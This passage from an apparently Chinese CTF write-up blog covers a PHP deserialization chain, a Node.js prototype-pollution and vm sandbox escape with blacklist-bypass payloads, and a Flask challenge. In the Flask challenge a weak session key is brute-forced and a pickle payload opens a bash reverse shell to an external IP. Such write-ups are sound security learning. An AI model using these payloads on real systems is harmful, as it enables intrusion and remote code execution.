+<span class="hljs-variable">$dataObject</span>-&gt;data = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;key1&#x27;</span> =&gt; <span class="hljs-variable">$cache1</span>, <span class="hljs-string">&#x27;key2&#x27;</span> =&gt; <span class="hljs-variable">$cache2</span>);
+<span class="hljs-variable">$dataObject</span>-&gt;storage = <span class="hljs-variable">$storage</span>;
+
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$dataObject</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>确实很细节，<code>$storage-&gt;store = &amp;$cache2-&gt;expired;</code>，当store数组中有值时，<code>Cache</code>中的<code>$this-&gt;expired)</code>就可以返回<code>true</code></p>
+<p>所以要先在数组中放入一个没有任何用的<code>$cache1</code>，为什么是实例化的Cache呢，是为了防止在<code>Storage</code>的 <code>if (!$value-&gt;expired()) &#123;</code>中报错</p>
+<p><code>$dataObject-&gt;data = array(&#39;key1&#39; =&gt; $cache1, &#39;key2&#39; =&gt; $cache2);</code>顺序不能反着来</p>
+<h2 id="ez-sandbox"><a href="#ez-sandbox" class="headerlink" title="ez_sandbox"></a>ez_sandbox</h2><p>几乎没做过沙箱题目</p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>)
+<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);
+
+<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)
+<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)
+<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)
+
+<span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>()
+
+app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>())
+app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">session</span>(&#123;
+    <span class="hljs-attr">secret</span>: crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">64</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),
+    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,
+    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">true</span>
+&#125;))
+
+<span class="hljs-keyword">var</span> users = &#123;&#125;
+<span class="hljs-keyword">var</span> admins = &#123;&#125;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;
+        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;
+            <span class="hljs-keyword">continue</span>
+        &#125;
+        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;
+            <span class="hljs-title function_">merge</span>(target[key], source[key])
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            target[key] = source[key]
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> target
+&#125;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) &#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, source)
+&#125;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">code</span>) &#123;
+    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&#x27;constructor&#x27;</span>, <span class="hljs-string">&#x27;mainModule&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;child_process&#x27;</span>, <span class="hljs-string">&#x27;process&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execSync&#x27;</span>, <span class="hljs-string">&#x27;execFile&#x27;</span>, <span class="hljs-string">&#x27;execFileSync&#x27;</span>, <span class="hljs-string">&#x27;spawn&#x27;</span>, <span class="hljs-string">&#x27;spawnSync&#x27;</span>, <span class="hljs-string">&#x27;fork&#x27;</span>]
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v <span class="hljs-keyword">of</span> blacklist) &#123;
+        <span class="hljs-keyword">if</span> (code.<span class="hljs-title function_">includes</span>(v)) &#123;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(v + <span class="hljs-string">&#x27; is banned&#x27;</span>)
+        &#125;
+    &#125;
+&#125;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;
+    <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>) &#123;
+        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-title function_">next</span>()
+    &#125;
+&#125;
+
+app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) &#123;
+        <span class="hljs-keyword">delete</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[key]
+    &#125;
+    <span class="hljs-title function_">next</span>()
+&#125;)
+
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;
+    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/index.html&#x27;</span>)
+&#125;)
+
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;
+    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/login.html&#x27;</span>)
+&#125;)
+
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;
+    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/register.html&#x27;</span>)
+&#125;)
+
+app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;
+    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)
+
+    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;
+        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username
+
+        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123;
+            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span>
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span>
+        &#125;
+
+        res.<span class="hljs-title function_">send</span>(&#123;
+            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login success&#x27;</span>
+        &#125;)
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        res.<span class="hljs-title function_">send</span>(&#123;
+            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login failed&#x27;</span>
+        &#125;)
+    &#125;
+&#125;)
+
+app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;
+    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)
+
+    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;
+        res.<span class="hljs-title function_">send</span>(&#123;
+            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register failed&#x27;</span>
+        &#125;)
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        users[username] = password
+        res.<span class="hljs-title function_">send</span>(&#123;
+            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register success&#x27;</span>
+        &#125;)
+    &#125;
+&#125;)
+
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/profile&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;
+    res.<span class="hljs-title function_">send</span>(&#123;
+        <span class="hljs-string">&#x27;user&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>,
+        <span class="hljs-string">&#x27;role&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span>
+    &#125;)
+&#125;)
+
+app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/sandbox&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;
+    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;
+        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span>
+        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)
+        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox)
+        
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-title function_">waf</span>(code)
+            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context)
+            res.<span class="hljs-title function_">send</span>(&#123;
+                <span class="hljs-string">&#x27;result&#x27;</span>: result
+            &#125;)
+        &#125; <span class="hljs-keyword">catch</span> (e) &#123;
+            res.<span class="hljs-title function_">send</span>(&#123;
+                <span class="hljs-string">&#x27;result&#x27;</span>: e.<span class="hljs-property">message</span>
+            &#125;)
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        res.<span class="hljs-title function_">send</span>(&#123;
+            <span class="hljs-string">&#x27;result&#x27;</span>: <span class="hljs-string">&#x27;Your role is not admin, so you can not run any code&#x27;</span>
+        &#125;)
+    &#125;
+&#125;)
+
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/logout&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;
+    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">destroy</span>()
+    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)
+&#125;)
+
+app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;
+    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;server start listening on :3000&#x27;</span>)
+&#125;)</code></pre></div>
+
+<p>首先是原型链污染</p>
+<p>代码在注册和登录的时候使用了 <code>clone(req.body)</code></p>
+<div class="code-wrapper"><pre><code class="hljs n1ql">function <span class="hljs-keyword">merge</span>(target, source) &#123;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source) &#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;
+            <span class="hljs-keyword">continue</span>
+        &#125;
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> source &amp;&amp; <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> target) &#123;
+            <span class="hljs-keyword">merge</span>(target[<span class="hljs-keyword">key</span>], source[<span class="hljs-keyword">key</span>])
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            target[<span class="hljs-keyword">key</span>] = source[<span class="hljs-keyword">key</span>]
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> target
+&#125;
+
+<span class="hljs-keyword">function</span> clone(source) &#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">merge</span>(&#123;&#125;, source)
+&#125;</code></pre></div>
+
+<p>过滤了<code>__proto__</code>可以用<code>constructor.prototype</code>绕过</p>
+<p>先注册一个 test 用户, 在登录时 POST 如下内容, 污染 admins 对象, 使得 <code>username in admins</code> 表达式的结果为 True</p>
+<div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>
+    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+        <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>
+            <span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;123&quot;</span>
+        <span class="hljs-punctuation">&#125;</span>
+    <span class="hljs-punctuation">&#125;</span>
+<span class="hljs-punctuation">&#125;</span></code></pre></div>
+
+<p>污染的是<code>&#123;&#125;</code>的<code>constructor.prototype</code>，即Object中会有一个test属性</p>
+<p>所以当</p>
+<div class="code-wrapper"><pre><code class="hljs">if (username in users &amp;&amp; password === users[username]) &#123;
+    req.session.user = username
+
+    if (username in admins) &#123;
+        req.session.role = &#39;admin&#39;
+    &#125; else &#123;
+        req.session.role = &#39;guest&#39;
+    &#125;
+</code></pre></div>
+<p>判断时，<code>admins</code>数组会优先从<code>Object</code>中获取到test，于是test账号成为了admin</p>
+<p>然后就是vm沙箱逃逸</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a>写的很好</p>
+<div class="code-wrapper"><pre><code class="hljs">    let code = req.body.code
+    let sandbox = Object.create(null)
+    let context = vm.createContext(sandbox)
+    
+    try &#123;
+        waf(code)
+        let result = vm.runInContext(code, context)
+        res.send(&#123;
+            &#39;result&#39;: result
+        &#125;)
+</code></pre></div>
+<p>直接使用文章中的代码，但是有waf，手动拼接进行绕过</p>
+<p>wp中给出了两种方法</p>
+<div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">// method 1</span>
+<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123; <span class="hljs-comment">// Proxy 对象用于创建对某一对象的代理, 以实现属性和方法的拦截</span>
+    <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-comment">// 访问这个对象的任意一个属性都会执行 get 指向的函数</span>
+        <span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>
+        <span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()
+        <span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();
+    &#125;
+&#125;)
+
+
+<span class="hljs-comment">// method 2</span>
+<span class="hljs-keyword">let</span> obj = &#123;&#125; <span class="hljs-comment">// 针对该对象的 message 属性定义一个 getter, 当访问 obj.message 时会调用对应的函数</span>
+obj.<span class="hljs-title function_">__defineGetter__</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;
+    <span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span>
+    <span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()
+    <span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();
+&#125;)
+<span class="hljs-keyword">throw</span> obj</code></pre></div>
+
+<h1 id="第三周"><a href="#第三周" class="headerlink" title="第三周"></a>第三周</h1><h2 id="notebook"><a href="#notebook" class="headerlink" title="notebook"></a>notebook</h2><p>开启题目，找了半天，原来是会给出<code>app.py</code>的</p>
+<div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> flask import Flask, request, render_template, session
+import pickle
+import uuid
+import os
+
+app = Flask(__name__)
+app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(2).hex()
+
+class Note(object):
+    def __init__(self, name, content):
+        self._name = name
+        self._content = content
+
+    @property
+    def name(self):
+        return self._name
+    
+    @property
+    def content(self):
+        return self._content
+
+
+@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)
+def index():
+    return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)
+
+
+@app.route(<span class="hljs-string">&#x27;/&lt;path:note_id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])
+def view_note(note_id):
+    notes = session.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;notes&#x27;</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:
+        return render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)
+    
+    note_raw = notes.<span class="hljs-built_in">get</span>(note_id)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_raw:
+        return render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)
+    
+   <span class="hljs-built_in"> note </span>= pickle.loads(note_raw)
+    return render_template(<span class="hljs-string">&#x27;note.html&#x27;</span>, <span class="hljs-attribute">note_id</span>=note_id, <span class="hljs-attribute">note_name</span>=note.name, <span class="hljs-attribute">note_content</span>=note.content)
+
+
+@app.route(<span class="hljs-string">&#x27;/add_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])
+def add_note():
+    note_name = request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;note_name&#x27;</span>)
+    note_content = request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;note_content&#x27;</span>)
+
+    <span class="hljs-keyword">if</span> note_name == <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> note_content == <span class="hljs-string">&#x27;&#x27;</span>:
+        return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;add_failed&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;note name or content is empty&#x27;</span>)
+    
+    note_id = str(uuid.uuid4())
+   <span class="hljs-built_in"> note </span>= Note(note_name, note_content)
+
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;notes&#x27;</span>):
+        session[<span class="hljs-string">&#x27;notes&#x27;</span>] = &#123;&#125;
+    
+    notes = session[<span class="hljs-string">&#x27;notes&#x27;</span>]
+    notes[note_id] = pickle.dumps(note)
+    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes
+    return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;add_success&#x27;</span>, <span class="hljs-attribute">note_id</span>=note_id)
+
+
+@app.route(<span class="hljs-string">&#x27;/delete_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])
+def delete_note():
+    note_id = request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;note_id&#x27;</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_id:
+        return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)
+    
+    notes = session.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;notes&#x27;</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:
+        return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)
+    
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes.<span class="hljs-built_in">get</span>(note_id):
+        return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, <span class="hljs-attribute">msg</span>=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)
+    
+    del notes[note_id]
+    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes
+    return render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-attribute">status</span>=<span class="hljs-string">&#x27;delete_success&#x27;</span>)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    app.<span class="hljs-built_in">run</span>(<span class="hljs-attribute">host</span>=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-attribute">port</span>=8000, <span class="hljs-attribute">debug</span>=<span class="hljs-literal">False</span>)</code></pre></div>
+
+<p>一眼看到<code>pickle.loads()</code>和<code>pickle.dumps</code>并且毫无过滤</p>
+<p>并且结果都是在session中的，可以想到flask-session伪造</p>
+<p>有关session部分的操作没看懂的话可以把生成的session使用工具进行解码就会清楚很多</p>
+<p><code>app.config[&#39;SECRET_KEY&#39;] = os.urandom(2).hex()</code></p>
+<p>手动生成一下<code>os.urandom(2).hex()</code>，会发现是4位数，可以进行爆破</p>
+<p>wp中的python写字典</p>
+<div class="code-wrapper"><pre><code class="hljs livecodeserver">import itertools
+
+d = itertools.product(<span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>, <span class="hljs-keyword">repeat</span>=<span class="hljs-number">4</span>)
+
+<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dicts.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:
+        s = <span class="hljs-string">&#x27;&#x27;</span>.join(i)
+        f.<span class="hljs-built_in">write</span>(s + <span class="hljs-string">&#x27;\n&#x27;</span>)</code></pre></div>
+
+<p>要爆破session的话要用<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p>
+<p>就不能用<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<div class="code-wrapper"><pre><code class="hljs bash">flask-unsign -u -c <span class="hljs-string">&quot;eyJub3RlcyI6e319.ZRaiVg.28tEyvEpXfcjFl5rrQ7K_nkl208&quot;</span> -w dicts.txt --no-literal-eval</code></pre></div>
+
+<p>这里wp中<code>-c</code>后面用的是<strong>单引号</strong>，但我要用<strong>双引号</strong>才能成功（可能与wp作者用的是mac有关）</p>
+<div class="code-wrapper"><pre><code class="hljs llvm">D:\CTF-tool\python脚本\Flask-Unsign-master\tests&gt;flask-unsign -u -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;.eJw1yk0LgjAcgPGvErsPdG2yCR2WZFmMIt_S4_q7TGYFJVbid68OPZff5RnQ5fqo7sgfEBUeY1POsScAMKVMY87BwVNwoCLMHF0tft9EIx-dZJzt5L9ABaEwOg9v2gpjo36RtMIpyzixQTu3K5Juoj48EFbrPE8bqZ6q2X6tTUFEB8usg3Ws5Fu9VLl3izOdoXEcP8_pL4U.ZVy64Q.UC73ttAT_J3qfi-sfE7O2ryZjQ8&quot;</span> -w C:\Users\<span class="hljs-number">86136</span>\Desktop\challenge\test\upload\dict.txt --no-literal-eval
+
+[*] Session decodes <span class="hljs-keyword">to</span>: &#123;&#x27;notes&#x27;: &#123;&#x27;<span class="hljs-number">49655388</span><span class="hljs-number">-69</span>dd<span class="hljs-number">-445</span>b<span class="hljs-number">-88</span>d<span class="hljs-number">0</span><span class="hljs-number">-3</span>d<span class="hljs-number">0</span>de<span class="hljs-number">25</span>fc<span class="hljs-number">1</span>b<span class="hljs-number">9</span>&#x27;: b&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">95</span>&lt;\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>__main__\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>Note\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">93</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>)\<span class="hljs-keyword">x</span><span class="hljs-number">81</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>&#125;\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>(\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">05</span>_name\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">03123</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>_content\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">03321</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>ub.&#x27;&#125;&#125;
+[*] Starting brute-forcer with <span class="hljs-number">8</span> threads..
+[+] Found secret key after <span class="hljs-number">30464</span> attempts
+b&#x27;<span class="hljs-number">76</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>&#x27;</code></pre></div>
+
+<p>看到解码的内容，很明显，key对应的是路由，value对应的是pickle序列化后的值</p>
+<p>加上我们看到毫无过滤，直接手写opcode</p>
+<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/118.89.61.71/7777 0&gt;&amp;1&quot;&#x27;</span>
+<span class="hljs-string">ios</span>
+<span class="hljs-string">system</span>
+<span class="hljs-string">.&#x27;&#x27;&#x27;</span></code></pre></div>
+
+<p>给出wp中说到的一些细节</p>
+<blockquote>
